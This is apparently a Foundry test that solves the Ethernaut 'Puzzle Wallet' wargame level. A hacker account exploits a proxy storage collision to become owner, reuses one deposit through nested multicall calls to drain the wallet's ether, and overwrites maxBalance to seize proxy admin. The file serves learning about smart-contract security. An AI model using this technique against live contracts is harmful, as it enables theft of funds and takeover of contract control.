// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "./24_PuzzleWallet.sol";

contract AttackerPuzzleWalletTest is Test {
    address admin = makeAddr("admin");
    address hacker = makeAddr("hacker");

    PuzzleWallet puzzleWallet;
    PuzzleProxy puzzleProxy;
    address puzzleProxyAddress;
    address puzzleWalletAddress;

    function testPuzzleWallet() external {
        vm.startPrank(address(1));
        puzzleWalletAddress = address(new PuzzleWallet());
        puzzleProxy = new PuzzleProxy(admin, puzzleWalletAddress, "");
        puzzleProxyAddress = address(puzzleProxy);
        puzzleWallet = PuzzleWallet(puzzleProxyAddress);
        vm.stopPrank();

        vm.deal(puzzleProxyAddress, 0.001 ether);
        vm.deal(hacker, 0.009 ether);

        vm.startPrank(hacker);
        puzzleProxy.proposeNewAdmin(hacker);
        puzzleWallet.addToWhitelist(hacker);
        puzzleWallet.addToWhitelist(puzzleProxyAddress);
        puzzleWallet.addToWhitelist(puzzleWalletAddress);

        bytes memory dataDeposit = abi.encodeWithSignature("deposit()");
        bytes memory dataExecute = abi.encodeWithSignature("execute(address,uint256,bytes)", hacker, 0.002 ether, "");

        bytes[] memory datas2 = new bytes[](1);
        datas2[0] = dataDeposit;
        bytes memory dataMultiCall = abi.encodeWithSignature("multicall(bytes[])", datas2);

        bytes[] memory datas1 = new bytes[](3);
        datas1[0] = dataDeposit;
        datas1[1] = dataMultiCall;
        datas1[2] = dataExecute;

        puzzleWallet.multicall{value: 0.001 ether}(datas1);

        assertEq(puzzleProxy.admin(), admin);
        puzzleWallet.setMaxBalance(uint256(hacker));
        assertEq(puzzleProxy.admin(), hacker);
    }
}
